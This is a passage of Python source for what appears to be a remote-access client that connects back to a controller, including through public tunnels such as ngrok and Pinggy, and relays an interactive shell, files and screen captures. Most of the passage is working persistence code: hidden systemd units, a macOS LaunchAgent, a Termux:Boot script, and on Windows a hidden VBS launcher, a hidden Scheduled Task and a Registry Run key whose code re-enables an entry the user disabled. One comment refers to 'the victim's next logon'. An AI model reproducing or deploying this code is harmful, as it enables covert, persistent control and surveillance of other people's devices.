    service_name = 'autorun-{}.service'.format(AUTORUN_NAME)

    # Prefer a user service: it starts with the desktop session, so screen
    # capture works after a reboot too. (autorunner.py's Omarchy behaviour,
    # extended to any distro with a running systemd user manager.)
    if is_omarchy() or _user_manager_running():
        svc_dir = os.path.expanduser('~/.config/systemd/user')
        os.makedirs(svc_dir, exist_ok=True)
        graphical = bool(is_omarchy() or run_quiet(
            ['systemctl', '--user', 'is-active', '--quiet',
             'graphical-session.target']))
        if graphical:
            after = wanted = 'graphical-session.target'
        else:
            # No graphical-session.target: a headless server (or a desktop
            # without one). default.target is the only useful target there.
            after, wanted = None, 'default.target'
        svc_path = os.path.join(svc_dir, service_name)
        try:
            with open(svc_path, 'w') as f:
                f.write(_service_body(exec_cmd, silent, log_file, after, wanted, '',
                                     _systemd_user_environment()))
        except OSError as e:
            print('[-] Cannot write service: {}'.format(e))
            return False
        run_quiet(['systemctl', '--user', 'daemon-reload'])
        if not run_quiet(['systemctl', '--user', 'enable', '--now', service_name]):
            print('[-] systemctl --user enable failed.')
            return False
        print('[+] User service: {}'.format(svc_path))
        if graphical:
            print('[+] Starts with your desktop session after reboot, no window.')
        else:
            # A user unit only starts at boot if the user's manager is kept
            # alive; without linger it starts at the next login instead. This
            # is the normal case on Ubuntu Server / RHEL Server (SSH-only).
            linger = run_quiet(['loginctl', 'enable-linger', str(os.getuid())])
            if linger:
                print('[+] Starts at boot (linger enabled), no login needed.')
            else:
                print('[+] Starts when you log in after a reboot.')
                print('[!] To start at boot with nobody logged in (servers):')
                print('    sudo loginctl enable-linger {}'.format(
                    os.environ.get('USER') or os.getuid()))
        return True

    # No user manager (SSH-only / server style box): system service, needs root
    if os.geteuid() != 0:
        print('[-] Need root for a system service: re-run with sudo.')
        return False
    run_user = os.environ.get('SUDO_USER', 'root')
    user_line = '' if run_user == 'root' else 'User={}\n'.format(run_user)
    svc_path = '/etc/systemd/system/{}'.format(service_name)
    try:
        with open(svc_path, 'w') as f:
            f.write(_service_body(exec_cmd, silent, log_file,
                                  'network.target', 'multi-user.target', user_line))
    except OSError as e:
        print('[-] Cannot write service: {}'.format(e))
        return False
    run_quiet(['systemctl', 'daemon-reload'])
    if not run_quiet(['systemctl', 'enable', '--now', service_name]):
        print('[-] systemctl enable failed.')
        return False
    print('[+] System service: {}'.format(svc_path))
    print('[+] Runs at boot with no terminal window.')
    return True


def _run_later(argv, delay=3.0):
    """Run a command after this process has had time to send its reply.

    Used by unpersist: stopping the service that hosts the client before the
    controller receives the report made removal look failed and left the unit
    file behind. The helper is in its own session, so it survives a clean exit
    or the service stop it is about to perform."""
    if os.name == 'nt':
        return
    try:
        subprocess.Popen(
            ['/bin/sh', '-c', 'sleep {}; exec "$@"'.format(float(delay)), 'sh']
            + list(argv),
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL, start_new_session=True, close_fds=True)
    except Exception:
        pass


def _macos_running_under_label(label):
    """True when this process is the LaunchAgent we are about to reload."""
    if os.environ.get('XPC_SERVICE_NAME') == label:
        return True
    try:
        result = subprocess.run(
            ['launchctl', 'print', 'gui/{}/{}'.format(os.getuid(), label)],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
        if result.returncode != 0:
            return False
        for line in result.stdout.decode('utf-8', 'replace').splitlines():
            line = line.strip()
            if line.startswith('pid ='):
                try:
                    return int(line.split('=', 1)[1].strip()) == os.getpid()
                except ValueError:
                    return False
    except Exception:
        # If launchctl cannot tell us, never bootout a process that might be
        # the job serving this request. A LaunchAgent is a direct child of
        # launchd (ppid 1); a manual client normally is not.
        return os.getppid() == 1
    return False


def _macos_label():
    safe = re.sub(r'[^A-Za-z0-9.-]', '-', AUTORUN_NAME) or 'client'
    return 'com.autorun.{}'.format(safe)


def _macos_plist_path():
    return os.path.expanduser('~/Library/LaunchAgents/{}.plist'.format(_macos_label()))


def _macos_plist_bytes(ip, port, log_file):
    """Build the LaunchAgent plist (plistlib handles escaping/paths)."""
    import plistlib
    python = sys.executable or shutil.which('python3') or '/usr/bin/python3'
    log_path = os.path.abspath(log_file) if log_file else os.devnull
    data = {
        'Label': _macos_label(),
        'ProgramArguments': [python, SCRIPT_PATH, str(ip), str(port)],
        'RunAtLoad': True,
        # Restart crashes, but not a clean exit requested from the controller.
        'KeepAlive': {'SuccessfulExit': False},
        'WorkingDirectory': os.path.dirname(SCRIPT_PATH),
        'ProcessType': 'Interactive',
        'StandardOutPath': log_path,
        'StandardErrorPath': log_path,
    }
    return plistlib.dumps(data)


def setup_macos(ip, port, silent, log_file):
    """LaunchAgent in ~/Library/LaunchAgents: starts at login, no window."""
    label = _macos_label()
    plist_path = _macos_plist_path()
    try:
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
        with open(plist_path, 'wb') as f:
            f.write(_macos_plist_bytes(ip, port, log_file))
    except OSError as e:
        print('[-] Cannot write LaunchAgent: {}'.format(e))
        return False

    uid = os.getuid()
    service = 'gui/{}/{}'.format(uid, label)
    if _macos_running_under_label(label):
        # bootout would kill the process handling this persist request before
        # it can reply. The plist is already updated; launchd reads it at the
        # next login. The current instance keeps running with its old args.
        print('[i] This client is the running LaunchAgent; the updated plist')
        print('    will be used at the next login.')
    else:
        run_quiet(['launchctl', 'bootout', service])
        loaded = run_quiet(['launchctl', 'bootstrap', 'gui/{}'.format(uid), plist_path])
        if not loaded:
            loaded = run_quiet(['launchctl', 'load', '-w', plist_path])
        if not loaded:
            print('[-] launchctl could not load the LaunchAgent.')
            print('    Try: launchctl bootstrap gui/{} "{}"'.format(uid, plist_path))
            return False
        run_quiet(['launchctl', 'kickstart', '-k', service])

    print('[+] LaunchAgent: {}'.format(plist_path))
    print('[+] Starts automatically at login; no terminal window.')
    print('[i] The first screenshot may ask for Screen & System Audio Recording')
    print('    permission: System Settings > Privacy & Security (older macOS calls')
    print('    the pane Screen Recording).')
    if not silent:
        print('[i] macOS LaunchAgents always run in the background (no window).')
    if sys.version_info[:2] < (3, 9):
        print('[!] This Python is old ({}). Install Python 3.9+ from python.org'.format(
            platform.python_version()))
        print('    or Homebrew; the Xcode Command Line Tools Python is not supported.')
    return True


def _android_boot_path():
    return os.path.join(os.path.expanduser('~/.termux/boot'),
                        'autorun-{}.sh'.format(AUTORUN_NAME))


def _android_boot_script(ip, port, log_file):
    """Termux:Boot script. Quoted, absolute paths: boot has a minimal PATH."""
    import shlex
    python = sys.executable or shutil.which('python') or 'python'
    prefix = os.environ.get('PREFIX') or '/data/data/com.termux/files/usr'
    shell = os.path.join(prefix, 'bin', 'sh')
    log_path = (os.path.abspath(log_file) if log_file else
                os.path.expanduser('~/.termux/{}-client.log'.format(AUTORUN_NAME)))
    return (
        '#!{shell}\n'
        '# Generated by client.py --persist (Termux:Boot).\n'
        'cd {dir} || cd "$HOME"\n'
        '{wake} >/dev/null 2>&1 || true\n'
        'exec {python} {script} {ip} {port} >> {log} 2>&1\n'
    ).format(shell=shell,
             dir=shlex.quote(os.path.dirname(SCRIPT_PATH)),
             # Termux:Boot runs before anything holds a wake lock; this also
             # survives a reboot without the shell being opened first.
             wake=shlex.quote(os.path.join(prefix, 'bin', 'termux-wake-lock')),
             python=shlex.quote(python), script=shlex.quote(SCRIPT_PATH),
             ip=shlex.quote(str(ip)), port=int(port),
             log=shlex.quote(log_path))


def setup_android(ip, port, silent, log_file):
    """Termux:Boot entry. Android allows no true daemon without root, so the
    documented Termux rules (boot app + unrestricted battery + wake lock) are
    part of the setup output."""
    path = _android_boot_path()
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(_android_boot_script(ip, port, log_file))
        os.chmod(path, 0o700)
    except OSError as e:
        print('[-] Cannot write boot script: {}'.format(e))
        return False

    print('[+] Boot script: {}'.format(path))
    print('[+] Install Termux:Boot (F-Droid or GitHub), open it once, then reboot.')
    print('[+] Set Termux to Unrestricted: Settings > Apps > Termux > Battery.')
    print('[i] Android 12+: if Android kills it, disable phantom-process trimming')
    print('    (Termux wiki: "Processes are being killed"); the boot script takes')
    print('    a wake lock, and a running client holds one too.')
    print('[i] Android 17+: allow Nearby devices / local network for Termux,')
    print('    otherwise LAN connections to the controller are blocked.')
    print('[i] Screen capture needs root (su + screencap); shell and files work without.')
    print('[i] For shared storage (e.g. /sdcard/Download): run termux-setup-storage')
    print('    once, and allow "All files access" for Termux in Android settings.')
    print('[i] Prefer the F-Droid/GitHub Termux build; the Play Store build is limited.')
    if not silent:
        print('[i] Termux:Boot always starts the client in the background.')
    return True


def _pythonw_path():
    """Locate pythonw.exe (the GUI-subsystem interpreter = no console window)."""
    exe = sys.executable or ''
    if exe:
        d = os.path.dirname(exe)
        for name in ('pythonw.exe', 'pythonw'):
            cand = os.path.join(d, name)
            if os.path.exists(cand):
                return cand
    for name in ('pythonw.exe', 'pythonw'):
        p = shutil.which(name)
        if p:
            return p
    return None


def _make_vbs(executable, arg_path, extra_args, working_dir=None, log_file=None):
    """VBS launcher that starts a process with a hidden window.

    It also sets the working directory (Task Scheduler and WSH otherwise
    start in C:\\Windows\\System32) and, when requested, redirects both
    stdout and stderr to the log file."""
    base = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(), 'AutoRunner')
    os.makedirs(base, exist_ok=True)
    vbs_path = os.path.join(base, 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
    workdir = working_dir or os.path.dirname(SCRIPT_PATH) or os.getcwd()
    inner = '"{}" "{}"'.format(executable, arg_path)
    if extra_args:
        inner += ' ' + extra_args
    if log_file:
        log_path = os.path.abspath(log_file).replace('%', '%%')
        inner = 'cmd /c "{} >> "{}" 2>&1"'.format(inner, log_path)
    escaped = inner.replace('"', '""')
    content = ('Set WshShell = CreateObject("WScript.Shell")\r\n'
               'WshShell.CurrentDirectory = "{}"\r\n'
               'WshShell.Run "{}", 0, False\r\n').format(
                   workdir.replace('"', '""'), escaped)
    # WSH reads ANSI or UTF-16LE-with-BOM, not bare UTF-8. A non-ASCII user
    # path (José, 张三) would otherwise be mangled and the hidden launcher
    # would fail only on the victim's next logon.
    with open(vbs_path, 'w', encoding='utf-16') as f:
        f.write(content)
    return vbs_path


def _windows_command(ip, port, silent, log_file=None):
    """Return (execute, arguments, working_directory) for Windows.

    Silent mode always uses the VBS launcher: it hides the window, sets the
    working directory, and can redirect output. Visible mode uses Python
    directly, wrapping in cmd.exe only when a log file was requested."""
    args = '{} {}'.format(ip, port)
    workdir = os.path.dirname(SCRIPT_PATH) or os.getcwd()
    if silent:
        py = (_pythonw_path() or sys.executable
              or shutil.which('python') or 'python')
        vbs = _make_vbs(py, SCRIPT_PATH, args, workdir, log_file)
        return 'wscript.exe', '"{}"'.format(vbs), workdir
    py = sys.executable or shutil.which('python') or 'python'
    if log_file:
        log_path = os.path.abspath(log_file)
        inner = '"{}" "{}" {} >> "{}" 2>&1'.format(
            py, SCRIPT_PATH, args, log_path)
        return 'cmd.exe', '/c "{}"'.format(inner), workdir
    return py, '"{}" {}'.format(SCRIPT_PATH, args), workdir


def _register_task_powershell(task_name, execute, arguments, working_dir=None):
    action = ("$action = New-ScheduledTaskAction -Execute $exe -Argument $arg"
              if arguments else "$action = New-ScheduledTaskAction -Execute $exe")
    if working_dir:
        action += " -WorkingDirectory '{}'".format(working_dir.replace("'", "''"))
    ps = '\n'.join([
        "$ErrorActionPreference = 'Stop'",
        "$exe = '{}'".format(execute.replace("'", "''")),
        "$arg = '{}'".format(arguments.replace("'", "''")),
        action,
        "$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME",
        "$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries "
        "-DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)",
        "$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME "
        "-LogonType Interactive -RunLevel Limited",
        "Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger "
        "-Settings $settings -Principal $principal -Force | Out-Null".format(task_name),
    ])
    fd, path = tempfile.mkstemp(suffix='.ps1', text=True)
    try:
        # Windows PowerShell 5.1 reads a .ps1 without a BOM as ANSI; a
        # non-ASCII path in New-ScheduledTaskAction would then be corrupted.
        with os.fdopen(fd, 'w', encoding='utf-8-sig') as f:
            f.write(ps)
        return run_quiet(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', path])
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def _register_task_schtasks(task_name, execute, arguments, working_dir=None):
    launch = ('"{}" {}'.format(execute, arguments) if arguments
              else '"{}"'.format(execute))
    if working_dir:
        launcher = 'cmd.exe /c cd /d "{}" && {}'.format(working_dir, launch)
    else:
        launcher = launch
    return run_quiet(['schtasks', '/Create', '/TN', task_name, '/TR', launcher,
                      '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'])


def _windows_registry_fallback(task_name, execute, arguments, working_dir=None):
    try:
        import winreg
    except ImportError:
        print('[-] winreg unavailable.')
        return False
    launch = ('"{}" {}'.format(execute, arguments) if arguments
              else '"{}"'.format(execute))
    if working_dir:
        cmd = 'cmd.exe /c cd /d "{}" && {}'.format(working_dir, launch)
    else:
        cmd = launch
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    approved_key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, task_name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
        try:                              # clear a "disabled" flag Task Manager may have set
            ka = winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(ka, task_name, 0, winreg.REG_BINARY,
                              bytes([0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]))
            winreg.CloseKey(ka)
        except FileNotFoundError:
            pass
        print('[+] Registry entry: HKCU\\{}\\{}'.format(run_key, task_name))
        return True
    except OSError as e:
        print('[-] Registry error: {}'.format(e))
        return False


def setup_windows(ip, port, silent, log_file=None):
    task_name = 'AutoRun_{}'.format(AUTORUN_NAME)
    execute, arguments, working_dir = _windows_command(ip, port, silent, log_file)

    if _register_task_powershell(task_name, execute, arguments, working_dir):
        print("[+] Scheduled Task '{}' created (hidden, at logon).".format(task_name))
    elif _register_task_schtasks(task_name, execute, arguments, working_dir):
        print("[+] Scheduled Task '{}' created via schtasks.".format(task_name))
    else:
        print('[!] schtasks failed; falling back to the registry...')
        if not _windows_registry_fallback(task_name, execute, arguments, working_dir):
            return False

    run_quiet(['schtasks', '/Run', '/TN', task_name])
    return True


def install_autostart(ip, port, silent=True, log_file=None):
    """Set this client up to start automatically after reboot/logon.
    Returns the setup log as text (also used as the reply to the controller)."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        print('[*] OS: {}'.format(get_os_info()))
        print('[*] Mode: {}'.format('silent (no window)' if silent else 'visible'))
        print('[*] Program: {} {} {}'.format(SCRIPT_PATH, ip, port))
        os_type = platform.system().lower()
        try:
            if is_android():
                ok = setup_android(ip, port, silent, log_file)
            elif is_ios():
                print('[-] iOS/iPadOS does not allow persistent background apps.')
                print('    Apple suspends sandboxed apps about 30 seconds after they')
                print('    leave the foreground; only a jailbroken device can persist.')
                ok = False
            elif is_macos():
                ok = setup_macos(ip, port, silent, log_file)
            elif os_type == 'linux':
                ok = setup_linux(ip, port, silent, log_file)
            elif os_type == 'windows':
                ok = setup_windows(ip, port, silent, log_file)
            else:
                print('[-] Unsupported OS: {}'.format(platform.system()))
                ok = False
        except Exception as e:
            print('[-] Unexpected error: {}'.format(e))
            ok = False
        if ok:
            print('[+] Done. The client will start automatically after reboot/logon.')
            print('    Nothing will appear on screen - you can close the terminal window.')
    return buf.getvalue().strip()


def remove_autostart():
    """Remove the auto-start entry. Returns the log as text."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        os_type = platform.system().lower()
        service_name = 'autorun-{}.service'.format(AUTORUN_NAME)
        task_name = 'AutoRun_{}'.format(AUTORUN_NAME)

        if is_android():
            path = _android_boot_path()
            if os.path.exists(path):
                try:
                    os.remove(path)
                    print('[+] Boot script removed: {}'.format(path))
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(path, e))
            else:
                print('[-] No Termux:Boot entry found.')
            print('[+] A running client stays up until closed or Termux is stopped.')

        elif is_ios():
            print('[-] Nothing to remove: iOS/iPadOS does not allow persistent')
            print('    background apps, so no autostart entry can exist (stock iOS).')

        elif is_macos():
            label = _macos_label()
            plist_path = _macos_plist_path()
            removed = False
            if os.path.exists(plist_path):
                try:
                    os.remove(plist_path)       # remove first: never lose it
                    removed = True
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(plist_path, e))
            if removed:
                # Do not bootout synchronously: the request is normally served
                # by the LaunchAgent itself, and killing it here would drop the
                # unpersist reply before the unit file deletion was reported.
                _run_later(['launchctl', 'bootout',
                            'gui/{}/{}'.format(os.getuid(), label)])
            print('[+] macOS autostart removed.' if removed else '[-] No LaunchAgent found.')
            if removed:
                print('[+] The auto-started client instance (if running) will stop shortly.')

        elif os_type == 'linux':
            removed = False
            user_path = os.path.expanduser('~/.config/systemd/user/{}'.format(service_name))
            user_removed = False
            if os.path.exists(user_path):
                # disable (without --now) only removes the enable symlinks;
                # deleting the unit first means a stop can never leave it
                # behind, and the reply is sent before the detached stop.
                run_quiet(['systemctl', '--user', 'disable', service_name])
                try:
                    os.remove(user_path)
                    user_removed = removed = True
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(user_path, e))
                run_quiet(['systemctl', '--user', 'daemon-reload'])
            system_path = '/etc/systemd/system/{}'.format(service_name)
            system_removed = False
            if os.path.exists(system_path):
                if os.geteuid() == 0:
                    run_quiet(['systemctl', 'disable', service_name])
                    try:
                        os.remove(system_path)
                        system_removed = removed = True
                    except OSError as e:
                        print('[-] Could not remove {}: {}'.format(system_path, e))
                    run_quiet(['systemctl', 'daemon-reload'])
                else:
                    print('[-] A system service exists - remove it with sudo.')
            if user_removed:
                _run_later(['systemctl', '--user', 'stop', service_name])
            if system_removed:
                _run_later(['systemctl', 'stop', service_name])
            print('[+] Autostart removed.' if removed else '[-] No autostart entry found.')
            if removed:
                print('[+] The auto-started client instance (if running) will stop shortly.')

        elif os_type == 'windows':
            run_quiet(['schtasks', '/Delete', '/TN', task_name, '/F'])
            try:
                import winreg
                for path in (r'Software\Microsoft\Windows\CurrentVersion\Run',
                             r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'):
                    try:
                        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
                        try:
                            winreg.DeleteValue(k, task_name)
                        except FileNotFoundError:
                            pass
                        winreg.CloseKey(k)
                    except FileNotFoundError:
                        pass
            except ImportError:
                pass
            vbs = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(),
                               'AutoRunner', 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
            try:
                os.remove(vbs)
            except OSError:
                pass
            print('[+] Windows autostart removed.')
            print('[+] A running client stays up until closed or rebooted.')

        else:
            print('[-] Unsupported OS: {}'.format(os_type))
    return buf.getvalue().strip()


def _looks_like_tunnel_host(host):
    """Hosts whose bare name normally means a public HTTPS tunnel."""
    value = (host or '').strip().lower().rstrip('.')
    return any(value == suffix or value.endswith('.' + suffix) or
               value.endswith(suffix)
               for suffix in (
                   'ngrok-free.app', 'ngrok-free.dev', 'ngrok.app',
                   'ngrok.io', 'ngrok.dev',
                   'pinggy.link', 'pinggy-free.link', 'pinggy.io',
                   'pinggy.net', 'pinggy.online', 'pinggy.top',
                   'trycloudflare.com', 'loca.lt', 'serveo.net',
                   'localhost.run', 'bore.pub', 'tunnelmole.net',
                   'telebit.cloud'))


def _default_port_for_scheme(scheme, host=None):
    scheme = (scheme or '').lower()
    if scheme == 'http':
        return 80
    if scheme == 'https':
        return 443
    if scheme in ('ws', 'wss'):
        return 80 if scheme == 'ws' else 443
    if scheme == 'tls':
        # Pinggy's tls:// tunnel URL has no port; its TLS listener is 443.
        # A direct LAN TLS endpoint should normally include its port.
        return 443
    if scheme == 'tcp':
        return DEFAULT_PORT
    if host and _looks_like_tunnel_host(host):
        return 443
    return DEFAULT_PORT


def _parse_address(raw, explicit_port=None):
    """Turn anything a user or tunnel prints into (host, port, scheme).

    Accepted forms:
      192.168.1.20             host:4444
      tcp://host:4444          tls://host:4444
      http://host:4444/        https://name.ngrok-free.app
      https://name.run.pinggy-free.link
      [2001:db8::1]:4444       https://[2001:db8::1]:4444
    A path is ignored because the controller's endpoints are fixed.
    """
    text = str(raw or '').strip()
    if not text:
        text = DEFAULT_IP
    scheme = ''
    host = ''
    port = None
    if '://' in text:
        parsed = urlsplit(text)
        scheme = (parsed.scheme or '').lower()
        if scheme == 'ws':
            scheme = 'http'
        elif scheme == 'wss':
            scheme = 'https'
        if scheme not in ('tcp', 'tls', 'http', 'https', 'auto'):
            raise ValueError('unsupported address scheme {!r}'.format(scheme))
        host = parsed.hostname or ''
        try:
            port = parsed.port
        except ValueError:
            raise ValueError('invalid port in {!r}'.format(text))
    else:
        # Bracketed IPv6: [::1]:4444 or [::1]
        if text.startswith('['):
            end = text.find(']')
            if end < 0:
                raise ValueError('unclosed IPv6 address {!r}'.format(raw))
            host = text[1:end]
            rest = text[end + 1:]
            if rest.startswith(':'):
                port = int(rest[1:])
        elif text.count(':') == 1:
            host, possible_port = text.rsplit(':', 1)
            if possible_port.isdigit():
                port = int(possible_port)
            else:
                host = text
        else:
            host = text
    host = (host or '').strip().strip('[]')
    if not host:
        raise ValueError('address has no host: {!r}'.format(raw))
    if explicit_port is not None:
        port = explicit_port
    if port is None:
        port = _default_port_for_scheme(scheme or (CONNECTION_TYPE
                                                   if CONNECTION_TYPE != 'auto'
                                                   else ''), host)
    if not 0 < int(port) < 65536:
        raise ValueError('port {} is out of range'.format(port))
    if not scheme:
        if CONNECTION_TYPE != 'auto':
            scheme = CONNECTION_TYPE
        elif _looks_like_tunnel_host(host) or port == 443:
            scheme = 'https'
        else:
            scheme = 'auto'
    return host, int(port), scheme


def parse_args(argv):
    """client.py [address] [optional_port]
                [--persist | --remove-persist] [--visible] [--log-file PATH]

    The first positional argument may be a bare IP, host:port, or a full URL
    printed by Pinggy/ngrok.  For compatibility a second positional integer is
    still accepted as an explicit port override."""
    ip = DEFAULT_IP
    port_override = None
    persist = remove = visible = False
    log_file = None
    positional = []
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == '--persist':
            persist = True
        elif a in ('--remove-persist', '--remove'):
            remove = True
        elif a == '--visible':
            visible = True
        elif a in ('--log-file', '--logfile'):
            if i + 1 < len(argv):
                i += 1
                log_file = argv[i]
            else:
                sys.stderr.write('[!] --log-file needs a path; ignoring it.\n')
        elif a.startswith('--log-file='):
            log_file = a.split('=', 1)[1] or None
        elif a.startswith('-') and a != '-':
            # Never turn a typo such as --visable into the controller address:
            # the client would silently retry against that "host" forever.
            sys.stderr.write('[!] Unknown option {!r}; ignoring it.\n'.format(a))
        else:
            positional.append(a)
        i += 1
    if len(positional) > 2:
        sys.stderr.write('[!] Extra arguments ignored: {}\n'.format(
            ' '.join(positional[2:])))
    if positional:
        ip = positional[0]
    if len(positional) > 1:
        try:
            port_override = int(positional[1])
        except ValueError:
            sys.stderr.write('[!] {!r} is not a port number; ignoring it.\n'.format(
                positional[1]))
    try:
        host, port, scheme = _parse_address(ip, port_override)
    except (ValueError, OSError) as e:
        sys.stderr.write('[!] Bad controller address {!r}: {}; using {}:{}.\n'.format(
            ip, e, DEFAULT_IP, DEFAULT_PORT))
        host, port, scheme = _parse_address(DEFAULT_IP)
    return host, port, scheme, persist, remove, visible, log_file


def _loopback_target(address):
    """True for addresses that only ever mean 'this machine'."""
    value = (address or '').strip().strip('[]').lower()
    return value in ('localhost', '::1', '0.0.0.0') or value.startswith('127.')


def _connect_error_hint(e):
    """A plain-language reason for a failed connect attempt. VM networks have
    two classic traps: the wrong address, and NAT - a guest reaches the host,
    but the host needs a port-forward (or Bridged/Host-only) to reach a guest."""
    if isinstance(e, socket.gaierror):
        return "cannot resolve that address; check the IP or hostname"
    if isinstance(e, (socket.timeout, TimeoutError)):
        hint = ("timed out - wrong address or port, a firewall drops the "
                "packets, or host -> guest over NAT without a port forward")
        if is_android() and android_api() >= 37:
            # Android 17 gates LAN traffic behind a runtime permission on
            # builds that target the new SDK; without it connects just hang.
            hint += ("; on Android 17+ allow Nearby devices for Termux "
                     "(Settings > Apps > Termux > Permissions)")
        return hint
    if isinstance(e, ConnectionRefusedError):
        return ("connection refused - nothing is listening there (controller "
                "not running, wrong port, or a firewall)")
    if isinstance(e, ConnectionResetError):
        return "connection reset - something on that port is not the controller"
    if getattr(e, 'errno', None) in (101, 113) \
            or getattr(e, 'winerror', None) in (10051, 10065):
        return "no route to that address - the machines are not on the same network"
    return str(e)


_RESOLVER_LOCK = threading.Lock()
_RESOLVERS = {}


def _is_numeric_host(host):
    try:
        socket.getaddrinfo(host, None, type=socket.SOCK_STREAM,
                           flags=socket.AI_NUMERICHOST)
        return True
    except OSError:
        return False


def _resolve_host(host, port, timeout=5.0):
    """Resolve a hostname in a daemon thread with a bounded wait.

    getaddrinfo() has no timeout of its own; a blackholed resolver used to
    freeze the reconnect loop (and therefore the whole client) in the first
    connect attempt. One resolver thread per unresolved name is reused, so a
    retry every second cannot pile up threads."""
    key = (host, port)
    with _RESOLVER_LOCK:
        entry = _RESOLVERS.get(key)
        now = time.time()
        if entry is None or (entry['done'] and now - entry['created'] > 60):
            entry = {'created': now, 'done': False, 'result': None,
                     'error': None, 'thread': None}

            def resolve():
                try:
                    result = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
                except Exception as exc:
                    with _RESOLVER_LOCK:
                        entry['error'] = exc
                else:
                    with _RESOLVER_LOCK:
                        entry['result'] = result
                finally:
                    with _RESOLVER_LOCK:
                        entry['done'] = True

            entry['thread'] = threading.Thread(
                target=resolve, name='dns-resolver', daemon=True)
            _RESOLVERS[key] = entry
            entry['thread'].start()
        thread = entry['thread']
    thread.join(timeout)
    with _RESOLVER_LOCK:
        if entry['done']:
            if entry['error'] is not None:
                _RESOLVERS.pop(key, None)   # retry a transient DNS failure
                raise entry['error']
            return entry['result']
    raise socket.timeout('name resolution timed out for {}'.format(host))


def _connect_target(host, port):
    """Connect by IP without DNS, or by hostname with our bounded resolver."""
    if _is_numeric_host(host):
        return socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
    addresses = _resolve_host(host, port)
    last_error = None
    for family, socktype, proto, _canon, sockaddr in addresses:
        candidate = None
        try:
            candidate = socket.socket(family, socktype, proto)
            candidate.settimeout(CONNECT_TIMEOUT)
            candidate.connect(sockaddr)
            return candidate
        except OSError as e:
            last_error = e
            if candidate is not None:
                try:
                    candidate.close()
                except OSError:
                    pass
    raise last_error or OSError('no usable address for {}'.format(host))


# ---------------------------------------------------------------------------
# HTTP / HTTPS transport (client side)
#
# The raw protocol is unchanged.  The client writes a chunked POST /tunnel
# request and reads the controller's chunked 200 response.  Every command,
# file, frame and the interactive shell POST /shell travels through the same
# socketpair-shaped adapter, so the rest of the client stays transport-agnostic.
# ---------------------------------------------------------------------------

def _read_http_head(sock, timeout=HTTP_HANDSHAKE_TIMEOUT):
    try:
        sock.settimeout(timeout)
    except (AttributeError, OSError):
        pass
    data = b''
    try:
        while b'\r\n\r\n' not in data:
            if len(data) > HTTP_MAX_HEADER:
                raise OSError('HTTP response headers are too large')
            chunk = sock.recv(min(4096, HTTP_MAX_HEADER + 1 - len(data)))
            if not chunk:
                raise OSError('controller closed during the HTTP handshake')
            data += chunk
    except (socket.timeout, TimeoutError):
        raise OSError('HTTP handshake timed out')
    finally:
        try:
            sock.settimeout(None)
        except (AttributeError, OSError):
            pass
    head, _sep, extra = data.partition(b'\r\n\r\n')
    if len(head) > HTTP_MAX_HEADER:
        raise OSError('HTTP response headers are too large')
    return head.decode('latin-1', 'replace'), extra


def _http_headers(lines):
    headers = {}
    for line in lines:
        if not line:
            continue
        if line[:1] in (' ', '\t'):
            raise OSError('folded HTTP headers are not accepted')
        if ':' not in line:
            raise OSError('malformed HTTP response header')
        key, value = line.split(':', 1)
        key = key.strip().lower()
        if not key:
            raise OSError('empty HTTP response header')
        old = headers.get(key)
        headers[key] = (old + ',' + value.strip()) if old else value.strip()
    return headers


class HttpTunnel(object):
    """Socket-shaped full-duplex adapter over one HTTP/1.1 exchange."""

    def __init__(self, raw, initial=b'', name='http-tunnel'):
        self.raw = raw
        self.name = name
        _kernel_send_timeout(raw)
        self._in, self._out = socket.socketpair()
        self._in.settimeout(None)
        # The pump writes into the application side of the pair.  A one
        # second timeout lets close() stop a pump that is blocked because the
        # application stopped reading; it never delays a normal transfer.
        self._out.settimeout(1.0)
        try:
            for sock in (self._in, self._out):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUFFER)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_BUFFER)
        except OSError:
            pass
        self._buf = bytearray(initial)
        self._send_lock = threading.Lock()
        self._closed = False
        self._resources_closed = False
        self._write_closed = False
        self._last_rx = time.monotonic()
        self._next_ping = self._last_rx + CMON_HTTP_PING
        # A short receive timeout lets the pump send heartbeats and notice a
        # dead proxy; socket.timeout itself is not treated as EOF.
        try:
            self.raw.settimeout(1.0)
        except (AttributeError, OSError):
            pass
        self._reader = threading.Thread(target=self._pump,
                                        name=name + '-reader', daemon=True)
        self._reader.start()

    def fileno(self):
